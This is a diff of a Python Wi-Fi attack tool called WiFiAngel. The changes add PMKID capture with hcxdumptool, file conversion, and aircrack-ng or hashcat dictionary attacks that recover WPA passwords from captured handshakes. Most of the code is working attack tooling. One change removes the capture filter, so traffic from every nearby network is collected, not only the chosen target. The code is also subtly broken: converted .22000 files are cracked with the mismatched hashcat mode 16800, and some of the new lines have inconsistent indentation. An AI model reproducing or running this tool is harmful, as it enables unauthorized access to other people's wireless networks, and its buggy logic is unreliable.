@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 WiFiAngel - Wireless Network Security Analysis Tool
-Copyright (C) 2025 Cuma Kurt
+Copyright (C) 2024 Cuma Kurt
 
 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
@@ -66,6 +66,8 @@ from rich.text import Text
 from rich.tree import Tree
 import select
 from rich import box
+import netifaces
+import traceback
 
 def check_root():
     if os.geteuid() != 0:
@@ -921,10 +923,47 @@ class WiFiAngel:
         try:
             if choice == "1":
                 subprocess.run(["airmon-ng", "start", self.interface_name], stdout=subprocess.PIPE)
-                self.console.print("[bold green]Monitor mode activated![/]")
+                
+                # Monitor moduna geçtikten sonra yeni arayüz adını bul
+                interfaces = subprocess.check_output(["iwconfig"], stderr=subprocess.STDOUT).decode()
+                for line in interfaces.split('\n'):
+                    if "Mode:Monitor" in line:
+                        self.interface_name = line.split()[0]
+                        break
+                
+                self.console.print(f"[bold green]Monitor mode activated on {self.interface_name}![/]")
+                self.logger.info(f"Monitor mode activated on {self.interface_name}")
             elif choice == "2":
+                self.console.print("[bold yellow]Switching to managed mode...[/]")
+                
+                # Stop monitor mode
                 subprocess.run(["airmon-ng", "stop", self.interface_name], stdout=subprocess.PIPE)
-                self.console.print("[bold green]Switched to managed mode![/]")
+                
+                # Get original interface name (remove "mon" suffix if present)
+                if "mon" in self.interface_name:
+                    self.interface_name = self.interface_name.replace("mon", "")
+                
+                # Switch to managed mode
+                subprocess.run(["ip", "link", "set", self.interface_name, "down"], stdout=subprocess.PIPE)
+                subprocess.run(["iw", self.interface_name, "set", "type", "managed"], stdout=subprocess.PIPE)
+                subprocess.run(["ip", "link", "set", self.interface_name, "up"], stdout=subprocess.PIPE)
+                
+                # Restart NetworkManager
+                subprocess.run(["systemctl", "restart", "NetworkManager"], stdout=subprocess.PIPE)
+                
+                # Wait for changes to apply
+                time.sleep(2)
+                
+                # Verify the mode change
+                try:
+                    iw_info = subprocess.check_output(["iwconfig", self.interface_name], stderr=subprocess.STDOUT).decode()
+                    if "Mode:Managed" in iw_info:
+                        self.console.print(f"[bold green]Successfully switched to managed mode: {self.interface_name}[/]")
+                        self.logger.info(f"Switched to managed mode: {self.interface_name}")
+                    else:
+                        self.console.print("[bold yellow]Warning: Interface might not be in managed mode[/]")
+                except Exception as e:
+                    self.console.print(f"[bold red]Error verifying interface mode: {str(e)}[/]")
         except Exception as e:
             self.console.print(f"[bold red]Error: {str(e)}[/]")
 
@@ -956,7 +995,14 @@ class WiFiAngel:
 
         network = self.networks[self.selected_network]
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-        output_file = f"pmkid_{network['ssid']}_{timestamp}"
+        # Ensure handshake directory exists
+        handshake_dir = Path("handshake")
+        if not handshake_dir.exists():
+            self.console.print("[bold yellow]Creating handshake directory...[/]")
+            handshake_dir.mkdir(exist_ok=True)
+        
+        # Store PMKID files in handshake directory
+        output_file = handshake_dir / f"pmkid_{network['ssid']}_{timestamp}"
         pmkid_found = False
         start_time = time.time()
 
@@ -998,7 +1044,7 @@ class WiFiAngel:
 
             with Live(refresh_per_second=4) as live:
                 # Start PMKID capture
-                cmd = f"hcxdumptool -i {self.interface_name} -o {output_file}.pcapng --enable_status=1 --filtermode=2 --filterlist_ap={self.selected_network}"
+                cmd = f"hcxdumptool -i {self.interface_name} -w {output_file}.pcapng"
                 process = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
 
                 while True:
@@ -1112,220 +1158,293 @@ class WiFiAngel:
             if "1 handshake" not in result.stdout:
                 self.console.print(f"[bold red]Selected file does not contain a valid handshake![/]")
                 return
+        
+        elif choice == "2":
+            # Use PMKID File for dictionary attack
+            handshake_dir = Path("handshake")
+            if not handshake_dir.exists():
+                self.console.print("[bold yellow]Creating handshake directory...[/]")
+                handshake_dir.mkdir(exist_ok=True)
+            
+            # Check for PMKID files in the handshake directory
+            self.console.print("\n[bold yellow]PMKID File Options:[/]")
+            self.console.print("1. Select from captured PMKID files")
+            self.console.print("2. Specify custom PMKID file path")
+            self.console.print("0. Cancel")
+            
+            pmkid_option = Prompt.ask("Choose PMKID option", choices=["0", "1", "2"])
+            
+            if pmkid_option == "0":
+                return
+            elif pmkid_option == "1":
+                # List PMKID files from handshake directory
+                pmkid_files = list(handshake_dir.glob("*.22000")) + list(handshake_dir.glob("pmkid_*.pcapng"))
                 
-            # Ask for wordlist
-            self.console.print("\n[bold yellow]Select Wordlist:[/]")
-            self.console.print("1. Use default wordlist (wordlists/10-million-password-list-top-1000000.txt)")
-            self.console.print("2. Use rockyou wordlist (/usr/share/wordlists/rockyou.txt)")
-            self.console.print("3. Specify custom wordlist path")
-            wordlist_choice = Prompt.ask("Choose wordlist option", choices=["1", "2", "3"])
-            
-            if wordlist_choice == "1":
-                wordlist = "wordlists/10-million-password-list-top-1000000.txt"
-                if not os.path.exists(wordlist):
-                    self.console.print(f"[bold red]Default wordlist not found: {wordlist}[/]")
+                if not pmkid_files:
+                    self.console.print("[bold red]No PMKID files found in 'handshake' directory![/]")
                     return
-            elif wordlist_choice == "2":
-                wordlist = "/usr/share/wordlists/rockyou.txt"
-                if not os.path.exists(wordlist):
-                    self.console.print(f"[bold red]Rockyou wordlist not found: {wordlist}[/]")
-                    return
-            else:
-                wordlist = Prompt.ask("Enter path to wordlist")
-                if not os.path.exists(wordlist):
-                    self.console.print(f"[bold red]Wordlist not found: {wordlist}[/]")
-                    return
-            
-            # Start the cracking process with visual progress display
-            self.console.print(f"\n[bold green]Starting dictionary attack against: {selected_file.name}[/]")
-            self.console.print(f"[bold blue]Using wordlist: {wordlist}[/]")
-            self.console.print("[bold yellow]This process may take some time. Press Ctrl+C to stop.[/]")
-            
-            start_time = time.time()
-            password_found = False
-            last_progress = 0
-            last_speed = "0 k/s"
-            last_tested_keys = 0
-            total_keys = 0
-            eta = "Unknown"
-            current_key = ""
-            process = None  # Define process here so we can access it in finally block
-            
-            # Create a function to update the status display
-            def create_status_display():
-                # Create a simple progress bar with just percent completion
-                progress_percent = last_progress / 100
-                filled_length = int(50 * progress_percent)
-                empty_length = 50 - filled_length
                 
-                if progress_percent < 0.3:
-                    color = "bright_red"
-                elif progress_percent < 0.6:
-                    color = "bright_yellow"
-                elif progress_percent < 0.9:
-                    color = "bright_green"
-                else:
-                    color = "bright_blue"
+                self.console.print("\n[bold green]Available PMKID Files:[/]")
+                for idx, file in enumerate(pmkid_files, 1):
+                    self.console.print(f"{idx}. {file.name}")
+                
+                file_choice = Prompt.ask("\nSelect PMKID file (0 to cancel)", choices=["0"] + [str(i) for i in range(1, len(pmkid_files) + 1)])
+                if file_choice == "0":
+                    return
+                
+                selected_file = pmkid_files[int(file_choice) - 1]
+                
+                # If file is pcapng, convert to 22000 format
+                if selected_file.suffix == '.pcapng':
+                    output_file = selected_file.with_suffix('.22000')
+                    convert_cmd = f"hcxpcapngtool -o {output_file} {selected_file}"
+                    self.console.print(f"[bold blue]Converting PCAPNG to hashcat format...[/]")
+                    subprocess.run(convert_cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                     
-                # Only show progress bar, don't use panel
-                progress_bar = f"[{color}]{'━' * filled_length}[/][dim]{'╍' * empty_length}[/] [bold {color}]{last_progress:.2f}%[/]"
-                
-                return progress_bar
-            
-            # Run aircrack-ng in real-time with output processing
-            # Add -a 2 parameter to specify WPA/WPA2 attack mode
-            # Add -q for quieter output (less verbose)
-            # Add -e to specify the ESSID if known
-            bssid = None
-            essid = None
-            is_wpa3 = False
-            
-            # Get network info from handshake if possible
-            try:
-                aircrack_check = subprocess.run(["aircrack-ng", str(selected_file)], 
-                                             capture_output=True, text=True)
-                
-                # Parse aircrack-ng output line by line looking for network information
-                lines = aircrack_check.stdout.splitlines()
-                header_line_idx = -1
-                
-                # First find the header line with BSSID and ESSID
-                for i, line in enumerate(lines):
-                    if "BSSID" in line and "ESSID" in line:
-                        header_line_idx = i
-                        break
-                
-                # If we found the header, check the next line(s) for actual data
-                if header_line_idx >= 0 and header_line_idx + 1 < len(lines):
-                    for i in range(header_line_idx + 1, min(header_line_idx + 5, len(lines))):
-                        data_line = lines[i].strip()
-                        if data_line and not data_line.startswith("Choosing"):
-                            # Line format is typically: BSSID              ESSID
-                            parts = data_line.split(None, 1)  # Split on first whitespace
-                            if len(parts) >= 2 and len(parts[0]) == 17:  # MAC address length
-                                bssid = parts[0].strip()
-                                essid = parts[1].strip()
-                                
-                                # Check if WPA3 by looking for WPA3 in output
-                                if "WPA3" in aircrack_check.stdout:
-                                    is_wpa3 = True
-                                    self.console.print("[bold blue]WPA3 network detected[/]")
-                                
-                                self.logger.info(f"Extracted from handshake - BSSID: {bssid}, ESSID: {essid}, WPA3: {is_wpa3}")
-                                break
-            except Exception as e:
-                self.logger.error(f"Error extracting network info: {str(e)}")
-                
-            # Construct command with all needed parameters
-            if is_wpa3:
-                # For WPA3, we use hashcat instead for better compatibility
-                cmd = ["hashcat", "-m", "22000", "-a", "0", "-w", "3", "--force", str(selected_file), wordlist]
-                self.console.print("[bold blue]Using hashcat for WPA3 handshake cracking[/]")
-            else:
-                # Standard WPA/WPA2 attack with aircrack-ng
-                cmd = ["aircrack-ng", "-a", "2", "-w", wordlist]
-                
-                # Add ESSID if available - only if it looks valid
-                if essid and essid != "ESSID" and len(essid) > 0 and "Encryption" not in essid:
-                    cmd.extend(["-e", essid])
-                    self.console.print(f"[bold blue]Using network ESSID: {essid}[/]")
+                    if not output_file.exists() or os.path.getsize(str(output_file)) == 0:
+                        self.console.print(f"[bold red]Failed to convert PMKID file to hashcat format![/]")
+                        return
                     
-                # Finally add handshake file
-                cmd.append(str(selected_file))
+                    selected_file = output_file
+            else:  # pmkid_option == "2"
+                # Specify custom PMKID file path
+                file_path = Prompt.ask("Enter path to PMKID file (absolute or relative path)")
+                selected_file = Path(file_path)
+                
+                if not selected_file.exists():
+                    self.console.print(f"[bold red]File not found: {selected_file}[/]")
+                    return
+                
+                # If file is pcapng, convert to 22000 format
+                if selected_file.suffix.lower() == '.pcapng':
+                    output_file = selected_file.with_suffix('.22000')
+                    convert_cmd = f"hcxpcapngtool -o {output_file} {selected_file}"
+                    self.console.print(f"[bold blue]Converting PCAPNG to hashcat format...[/]")
+                    subprocess.run(convert_cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                    
+                    if not output_file.exists() or os.path.getsize(str(output_file)) == 0:
+                        self.console.print(f"[bold red]Failed to convert PMKID file to hashcat format![/]")
+                        return
+                    
+                    selected_file = output_file
+        
+        # Continue with shared code for both options
+        # Ask for wordlist
+        self.console.print("\n[bold yellow]Select Wordlist:[/]")
+        self.console.print("1. Use default wordlist (wordlists/10-million-password-list-top-1000000.txt)")
+        self.console.print("2. Use rockyou wordlist (/usr/share/wordlists/rockyou.txt)")
+        self.console.print("3. Specify custom wordlist path")
+        wordlist_choice = Prompt.ask("Choose wordlist option", choices=["1", "2", "3"])
+        
+        if wordlist_choice == "1":
+            wordlist = "wordlists/10-million-password-list-top-1000000.txt"
+            if not os.path.exists(wordlist):
+                self.console.print(f"[bold red]Default wordlist not found: {wordlist}[/]")
+                return
+        elif wordlist_choice == "2":
+            wordlist = "/usr/share/wordlists/rockyou.txt"
+            if not os.path.exists(wordlist):
+                self.console.print(f"[bold red]Rockyou wordlist not found: {wordlist}[/]")
+                return
+        else:
+            wordlist = Prompt.ask("Enter path to wordlist")
+            if not os.path.exists(wordlist):
+                self.console.print(f"[bold red]Wordlist not found: {wordlist}[/]")
+                return
+        
+        # Start the cracking process with visual progress display
+        self.console.print(f"\n[bold green]Starting dictionary attack against: {selected_file.name}[/]")
+        self.console.print(f"[bold blue]Using wordlist: {wordlist}[/]")
+        self.console.print("[bold yellow]This process may take some time. Press Ctrl+C to stop.[/]")
+        
+        start_time = time.time()
+        password_found = False
+        last_progress = 0
+        last_speed = "0 k/s"
+        last_tested_keys = 0
+        total_keys = 0
+        eta = "Unknown"
+        current_key = ""
+        process = None  # Define process here so we can access it in finally block
+        
+        # Create a function to update the status display
+        def create_status_display():
+            # Create a simple progress bar with just percent completion
+            progress_percent = last_progress / 100
+            filled_length = int(50 * progress_percent)
+            empty_length = 50 - filled_length
             
-            try:
-                # Add extra parameters to make output format more organized
-                process = subprocess.Popen(
-                    cmd,
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.STDOUT,  # Redirect stderr to stdout
-                    text=True,
-                    bufsize=1
-                )
+            if progress_percent < 0.3:
+                color = "bright_red"
+            elif progress_percent < 0.6:
+                color = "bright_yellow"
+            elif progress_percent < 0.9:
+                color = "bright_green"
+            else:
+                color = "bright_blue"
                 
-                # Initialize Rich Live display before starting to read process output
-                from rich.live import Live
+            # Only show progress bar, don't use panel
+            progress_bar = f"[{color}]{'━' * filled_length}[/][dim]{'╍' * empty_length}[/] [bold {color}]{last_progress:.2f}%[/]"
+            
+            return progress_bar
+        
+        # Run aircrack-ng in real-time with output processing
+        # Add -a 2 parameter to specify WPA/WPA2 attack mode
+        # Add -q for quieter output (less verbose)
+        # Add -e to specify the ESSID if known
+        bssid = None
+        essid = None
+        is_wpa3 = False
+        
+        # Get network info from handshake if possible
+        try:
+            aircrack_check = subprocess.run(["aircrack-ng", str(selected_file)], 
+                                         capture_output=True, text=True)
+            
+            # Parse aircrack-ng output line by line looking for network information
+            lines = aircrack_check.stdout.splitlines()
+            header_line_idx = -1
+            
+            # First find the header line with BSSID and ESSID
+            for i, line in enumerate(lines):
+                if "BSSID" in line and "ESSID" in line:
+                    header_line_idx = i
+                    break
+            
+            # If we found the header, check the next line(s) for actual data
+            if header_line_idx >= 0 and header_line_idx + 1 < len(lines):
+                for i in range(header_line_idx + 1, min(header_line_idx + 5, len(lines))):
+                    data_line = lines[i].strip()
+                    if data_line and not data_line.startswith("Choosing"):
+                        # Line format is typically: BSSID              ESSID
+                        parts = data_line.split(None, 1)  # Split on first whitespace
+                        if len(parts) >= 2 and len(parts[0]) == 17:  # MAC address length
+                            bssid = parts[0].strip()
+                            essid = parts[1].strip()
+                            
+                            # Check if WPA3 by looking for WPA3 in output
+                            if "WPA3" in aircrack_check.stdout:
+                                is_wpa3 = True
+                                self.console.print("[bold blue]WPA3 network detected[/]")
+                            
+                            self.logger.info(f"Extracted from handshake - BSSID: {bssid}, ESSID: {essid}, WPA3: {is_wpa3}")
+                            break
+        except Exception as e:
+            self.logger.error(f"Error extracting network info: {str(e)}")
+            
+                # Construct command with all needed parameters
+        if choice == "2":
+            # For PMKID, we use hashcat mode 16800
+            cmd = ["hashcat", "-m", "16800", "-a", "0", "-w", "3", "--force", str(selected_file), wordlist]
+            self.console.print("[bold blue]Using hashcat for PMKID cracking (mode 16800)[/]")
+        elif is_wpa3:
+            # For WPA3, we use hashcat instead for better compatibility
+            cmd = ["hashcat", "-m", "22000", "-a", "0", "-w", "3", "--force", str(selected_file), wordlist]
+            self.console.print("[bold blue]Using hashcat for WPA3 handshake cracking[/]")
+        else:
+            # Standard WPA/WPA2 attack with aircrack-ng
+            cmd = ["aircrack-ng", "-a", "2", "-w", wordlist]
+            
+            # Add ESSID if available - only if it looks valid
+            if essid and essid != "ESSID" and len(essid) > 0 and "Encryption" not in essid:
+                cmd.extend(["-e", essid])
+                self.console.print(f"[bold blue]Using network ESSID: {essid}[/]")
                 
-                # Save all output for later analysis
-                all_output = []
-                output_lines = []
-                
-                with Live(create_status_display(), refresh_per_second=4) as live:
-                    for line in iter(process.stdout.readline, ''):
-                        line = line.strip()
-                        if line:  # Skip empty lines
-                            all_output.append(line)
-                            output_lines.append(line)
-                            self.logger.debug(f"Aircrack output: {line}")
+            # Finally add handshake file
+            cmd.append(str(selected_file))        
+        try:
+            # Add extra parameters to make output format more organized
+            process = subprocess.Popen(
+                cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,  # Redirect stderr to stdout
+                text=True,
+                bufsize=1
+            )
+            
+            # Initialize Rich Live display before starting to read process output
+            from rich.live import Live
+            
+            # Save all output for later analysis
+            all_output = []
+            output_lines = []
+            
+            with Live(create_status_display(), refresh_per_second=4) as live:
+                for line in iter(process.stdout.readline, ''):
+                    line = line.strip()
+                    if line:  # Skip empty lines
+                        all_output.append(line)
+                        output_lines.append(line)
+                        self.logger.debug(f"Aircrack output: {line}")
+                    
+                    # Extract progress information - using regex for more precise matching
+                    try:
+                        # Find progress percentage
+                        progress_match = re.search(r'(\d+\.\d+)%', line)
+                        if progress_match:
+                            last_progress = float(progress_match.group(1))
                         
-                        # Extract progress information - using regex for more precise matching
-                        try:
-                            # Find progress percentage
-                            progress_match = re.search(r'(\d+\.\d+)%', line)
-                            if progress_match:
-                                last_progress = float(progress_match.group(1))
-                            
-                            # For hashcat, progress is displayed differently
-                            if is_wpa3 and "Progress.....: " in line:
-                                progress_parts = line.split("Progress.....: ")[1].split("%")[0].strip()
-                                try:
-                                    last_progress = float(progress_parts)
-                                except:
-                                    pass
-                            
-                            # Find tested keys count
-                            keys_match = re.search(r'(\d+)/(\d+) keys tested', line)
-                            if keys_match:
-                                last_tested_keys = int(keys_match.group(1))
-                                total_keys = int(keys_match.group(2))
-                            
-                            # For hashcat, speed is displayed differently
-                            if is_wpa3 and "Speed.#1" in line:
-                                speed_parts = line.split("Speed.#1.....: ")[1].strip()
-                                last_speed = speed_parts
-                            else:
-                                # Find speed (k/s or M/s)
-                                speed_match = re.search(r'(\d+[\.,]\d+ [kMG]?/s)', line)
-                                if speed_match:
-                                    last_speed = speed_match.group(1)
-                            
-                            # Find ETA
-                            eta_match = re.search(r'time left: ([^)]+)', line)
-                            if eta_match:
-                                eta = eta_match.group(1)
-                            
-                            # For hashcat, ETA is displayed differently
-                            if is_wpa3 and "Time.Estimated..." in line:
-                                eta_parts = line.split("Time.Estimated...: ")[1].strip()
-                                eta = eta_parts
-                            
-                            # Check for direct password patterns
-                            # Common patterns in aircrack-ng output
-                            direct_key_patterns = [
-                                r'KEY FOUND!\s*\[\s*([^\]]+)\s*\]',  # KEY FOUND! [ password ]
-                                r'KEY FOUND:\s*\[\s*([^\]]+)\s*\]',   # KEY FOUND: [ password ]
-                                r'The password is "([^"]+)"',         # The password is "password"
-                                r'Password:\s*([^\s]+)',              # Password: password
-                                r'FOUND KEY:\s*([^\s]+)'              # FOUND KEY: password
+                        # For hashcat, progress is displayed differently
+                        if is_wpa3 and "Progress.....: " in line:
+                            progress_parts = line.split("Progress.....: ")[1].split("%")[0].strip()
+                            try:
+                                last_progress = float(progress_parts)
+                            except:
+                                pass
+                        
+                        # Find tested keys count
+                        keys_match = re.search(r'(\d+)/(\d+) keys tested', line)
+                        if keys_match:
+                            last_tested_keys = int(keys_match.group(1))
+                            total_keys = int(keys_match.group(2))
+                        
+                        # For hashcat, speed is displayed differently
+                        if is_wpa3 and "Speed.#1" in line:
+                            speed_parts = line.split("Speed.#1.....: ")[1].strip()
+                            last_speed = speed_parts
+                        else:
+                            # Find speed (k/s or M/s)
+                            speed_match = re.search(r'(\d+[\.,]\d+ [kMG]?/s)', line)
+                            if speed_match:
+                                last_speed = speed_match.group(1)
+                        
+                        # Find ETA
+                        eta_match = re.search(r'time left: ([^)]+)', line)
+                        if eta_match:
+                            eta = eta_match.group(1)
+                        
+                        # For hashcat, ETA is displayed differently
+                        if is_wpa3 and "Time.Estimated..." in line:
+                            eta_parts = line.split("Time.Estimated...: ")[1].strip()
+                            eta = eta_parts
+                        
+                        # Check for direct password patterns
+                        # Common patterns in aircrack-ng output
+                        direct_key_patterns = [
+                            r'KEY FOUND!\s*\[\s*([^\]]+)\s*\]',  # KEY FOUND! [ password ]
+                            r'KEY FOUND:\s*\[\s*([^\]]+)\s*\]',   # KEY FOUND: [ password ]
+                            r'The password is "([^"]+)"',         # The password is "password"
+                            r'Password:\s*([^\s]+)',              # Password: password
+                            r'FOUND KEY:\s*([^\s]+)'              # FOUND KEY: password
+                        ]
+                        
+                        # Add hashcat specific patterns
+                        if is_wpa3:
+                            hashcat_patterns = [
+                                r'Status\.+: Cracked',  # Look for success status
+                                r'Hash\.Target\.+: (.+?):(.+?)$'  # Extract password from hash line
                             ]
-                            
-                            # Add hashcat specific patterns
-                            if is_wpa3:
-                                hashcat_patterns = [
-                                    r'Status\.+: Cracked',  # Look for success status
-                                    r'Hash\.Target\.+: (.+?):(.+?)$'  # Extract password from hash line
-                                ]
-                                direct_key_patterns.extend(hashcat_patterns)
-                            
-                            found_in_this_line = False
-                            for pattern in direct_key_patterns:
-                                match = re.search(pattern, line)
-                                if match:
-                                    # For hashcat status pattern
-                                    if pattern == r'Status\.+: Cracked':
-                                        # Password will be extracted later
-                                        continue
-                                        
+                            direct_key_patterns.extend(hashcat_patterns)
+                        
+                        found_in_this_line = False
+                        for pattern in direct_key_patterns:
+                            match = re.search(pattern, line)
+                            if match:
+                                # For hashcat status pattern
+                                if pattern == r'Status\.+: Cracked':
+                                    # Password will be extracted later
+                                    continue
+                                    
                                     # For hashcat hash pattern
                                     if pattern == r'Hash\.Target\.+: (.+?):(.+?)$' and len(match.groups()) >= 2:
                                         password_candidate = match.group(2).strip()
@@ -1345,200 +1464,197 @@ class WiFiAngel:
                                         process.terminate()
                                         found_in_this_line = True
                                         break
-                            
-                            if found_in_this_line:
-                                break
-                            
-                            # Update the screen with every line
-                            if len(line) > 0:
-                                status_display = create_status_display()
-                                live.update(status_display)
-                            
-                            # Show at least minimal progress while reading wordlist
-                            if any(x in line.lower() for x in ["reading", "loaded"]) and last_progress < 0.1:
-                                last_progress = 0.05
-                            
-                            # Update one more time when process finishes
-                            if process.poll() is not None:
-                                last_progress = 100.0  # Process completed
-                                status_display = create_status_display()
-                                live.update(status_display)
-                                break
-                        except Exception as e:
-                            self.logger.error(f"Error parsing aircrack output: {str(e)}")
+                        
+                        if found_in_this_line:
+                            break
+                        
+                        # Update the screen with every line
+                        if len(line) > 0:
+                            status_display = create_status_display()
+                            live.update(status_display)
+                        
+                        # Show at least minimal progress while reading wordlist
+                        if any(x in line.lower() for x in ["reading", "loaded"]) and last_progress < 0.1:
+                            last_progress = 0.05
+                        
+                        # Update one more time when process finishes
+                        if process.poll() is not None:
+                            last_progress = 100.0  # Process completed
+                            status_display = create_status_display()
+                            live.update(status_display)
+                            break
+                    except Exception as e:
+                        self.logger.error(f"Error parsing aircrack output: {str(e)}")
+            
+            # Process has completed - check if we missed finding the password by analyzing full output
+            if not password_found:
+                # First, join all output into a single string for full-text analysis
+                full_output = '\n'.join(all_output)
                 
-                # Process has completed - check if we missed finding the password by analyzing full output
-                if not password_found:
-                    # First, join all output into a single string for full-text analysis
-                    full_output = '\n'.join(all_output)
+                # Look for various password patterns in the full output
+                key_found_patterns = [
+                    r'KEY FOUND!\s*\[\s*([^\]]+)\s*\]',      # KEY FOUND! [ password ]
+                    r'KEY FOUND:\s*\[\s*([^\]]+)\s*\]',       # KEY FOUND: [ password ]
+                    r'The password is "([^"]+)"',             # The password is "password"
+                    r'Password:\s*([^\s]+)',                  # Password: password
+                    r'FOUND KEY:\s*([^\s]+)'                  # FOUND KEY: password
+                ]
+                
+                # Add WPA3/hashcat specific pattern
+                if is_wpa3:
+                    key_found_patterns.append(r'Hash\.Target\.+: (.+?):(.+?)$')
                     
-                    # Look for various password patterns in the full output
-                    key_found_patterns = [
-                        r'KEY FOUND!\s*\[\s*([^\]]+)\s*\]',      # KEY FOUND! [ password ]
-                        r'KEY FOUND:\s*\[\s*([^\]]+)\s*\]',       # KEY FOUND: [ password ]
-                        r'The password is "([^"]+)"',             # The password is "password"
-                        r'Password:\s*([^\s]+)',                  # Password: password
-                        r'FOUND KEY:\s*([^\s]+)'                  # FOUND KEY: password
+                for pattern in key_found_patterns:
+                    match = re.search(pattern, full_output)
+                    if match:
+                        # For hashcat hash pattern
+                        if pattern == r'Hash\.Target\.+: (.+?):(.+?)$' and len(match.groups()) >= 2:
+                            password_candidate = match.group(2).strip()
+                        else:
+                            password_candidate = match.group(1).strip()
+                            
+                        if (password_candidate and 
+                            not any(x in password_candidate for x in ["second", "%", "Master", "KEY", "Decrypting"])):
+                            current_key = password_candidate
+                            password_found = True
+                            self.logger.info(f"Password found in output analysis: {current_key}")
+                            break
+                
+                # If still not found, scan line by line
+                if not password_found:
+                    # For other patterns
+                    secondary_patterns = [
+                        r'([a-zA-Z0-9!@#$%^&*()_+\-=\[\]{}|;:,.<>/?]{8,63})'  # For typical WiFi passwords
                     ]
                     
-                    # Add WPA3/hashcat specific pattern
-                    if is_wpa3:
-                        key_found_patterns.append(r'Hash\.Target\.+: (.+?):(.+?)$')
-                        
-                    for pattern in key_found_patterns:
-                        match = re.search(pattern, full_output)
-                        if match:
-                            # For hashcat hash pattern
-                            if pattern == r'Hash\.Target\.+: (.+?):(.+?)$' and len(match.groups()) >= 2:
-                                password_candidate = match.group(2).strip()
-                            else:
-                                password_candidate = match.group(1).strip()
+                    # Scan through all output to find key
+                    for i, line in enumerate(output_lines):
+                        if "KEY FOUND" in line or "FOUND KEY" in line or "Cracked" in line:
+                            # Check next few lines for key
+                            for j in range(i, min(i+5, len(output_lines))):
+                                next_line = output_lines[j]
                                 
-                            if (password_candidate and 
-                                not any(x in password_candidate for x in ["second", "%", "Master", "KEY", "Decrypting"])):
-                                current_key = password_candidate
-                                password_found = True
-                                # self.console.print(f"\n[bold green]Password found in output analysis: {current_key}[/]")
-                                self.logger.info(f"Password found in output analysis: {current_key}")
+                                # Scan for common patterns in each line
+                                colon_parts = next_line.split(":")
+                                if len(colon_parts) >= 2 and not any(x in next_line for x in ["BSSID", "Index", "second", "%"]):
+                                    password_candidate = colon_parts[-1].strip()
+                                    if (password_candidate and 
+                                        not any(x in password_candidate for x in ["second", "%", "Master", "KEY", "Decrypting"])):
+                                        current_key = password_candidate
+                                        password_found = True
+                                        self.logger.info(f"Password found from line analysis: {current_key}")
+                                        break
+                            
+                            if password_found:
                                 break
-                    
-                    # If still not found, scan line by line
+                                    
+                    # If nothing found, look for hex pattern with brackets (common aircrack output format)
                     if not password_found:
-                        # For other patterns
-                        secondary_patterns = [
-                            r'([a-zA-Z0-9!@#$%^&*()_+\-=\[\]{}|;:,.<>/?]{8,63})'  # For typical WiFi passwords
-                        ]
-                        
-                        # Scan through all output to find key
-                        for i, line in enumerate(output_lines):
-                            if "KEY FOUND" in line or "FOUND KEY" in line or "Cracked" in line:
-                                # Check next few lines for key
-                                for j in range(i, min(i+5, len(output_lines))):
-                                    next_line = output_lines[j]
-                                    
-                                    # Scan for common patterns in each line
-                                    colon_parts = next_line.split(":")
-                                    if len(colon_parts) >= 2 and not any(x in next_line for x in ["BSSID", "Index", "second", "%"]):
-                                        password_candidate = colon_parts[-1].strip()
-                                        if (password_candidate and 
-                                            not any(x in password_candidate for x in ["second", "%", "Master", "KEY", "Decrypting"])):
-                                            current_key = password_candidate
-                                            password_found = True
-                                            # self.console.print(f"\n[bold green]Password found from line analysis: {current_key}[/]")
-                                            self.logger.info(f"Password found from line analysis: {current_key}")
-                                            break
-                                
-                                if password_found:
-                                    break
-                                    
-                        # If nothing found, look for hex pattern with brackets (common aircrack output format)
-                        if not password_found:
-                            bracket_matches = re.findall(r'\[\s*([a-zA-Z0-9!@#$%^&*()_+\-=\[\]{}|;:,.<>/?]{8,63})\s*\]', full_output)
-                            for match in bracket_matches:
-                                if not any(x in match for x in ["second", "%", "Master", "KEY", "Decrypting"]):
-                                    current_key = match
-                                    password_found = True
-                                    # self.console.print(f"\n[bold green]Password found from bracket pattern: {current_key}[/]")
-                                    self.logger.info(f"Password found from bracket pattern: {current_key}")
-                                    break
-                
-                # Additional validation to prevent false positives
-                if password_found:
-                    # Make sure the password is valid (contains only valid characters and length)
-                    # Check for common timing information that might be misinterpreted as password
-                    if (len(current_key) > 64 or
-                        len(current_key) < 8 or
-                        current_key.lower().startswith("master") or
-                        "second" in current_key.lower() or
-                        "minute" in current_key.lower() or
-                        "hour" in current_key.lower() or
-                        "progress" in current_key.lower() or
-                        "remaining" in current_key.lower() or
-                        "key" in current_key.lower() or
-                        "tested" in current_key.lower() or
-                        re.search(r'\d+\s*(?:second|minute|hour)', current_key, re.IGNORECASE) or
-                        re.search(r'\d+[:.]\d+[:.]\d+', current_key) or  # Matches time formats like 00:00:00
-                        re.search(r'\d+\.\d+%', current_key) or  # Matches percentage
-                        re.search(r'\[.*\d+[\.:]\d+.*\]', current_key)):  # Matches something with time in brackets
-                        self.logger.warning(f"Invalid password detected: {current_key} - marking as not found")
-                        password_found = False
-                        current_key = ""
-                
-                # Show detailed results in a table at the end of the process
-                end_time = time.time()
-                elapsed_time = end_time - start_time
-                
-                hours = int(elapsed_time // 3600)
-                minutes = int((elapsed_time % 3600) // 60)
-                seconds = int(elapsed_time % 60)
-                elapsed_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
-                
-                # Results table
-                result_table = Table(show_header=True, header_style="bold magenta", title="[bold blue]Dictionary Attack Results[/]")
-                result_table.add_column("Target", style="cyan")
-                result_table.add_column("Status", style="green")
-                result_table.add_column("Tested Keys", style="yellow")
-                result_table.add_column("Speed", style="magenta")
-                result_table.add_column("Time", style="blue")
-                result_table.add_column("Password", style="red")
-                
-                if password_found and current_key and len(current_key) >= 8 and len(current_key) <= 63:
-                    status = "[bold green]✓ CRACKED[/]"
-                    password_display = f"[bold red]{current_key}[/]"
-                else:
-                    status = "[bold red]✗ FAILED[/]"
-                    password_display = "[dim]Not Found[/dim]"
-                    # Reset these in case there was a false positive
+                        bracket_matches = re.findall(r'\[\s*([a-zA-Z0-9!@#$%^&*()_+\-=\[\]{}|;:,.<>/?]{8,63})\s*\]', full_output)
+                        for match in bracket_matches:
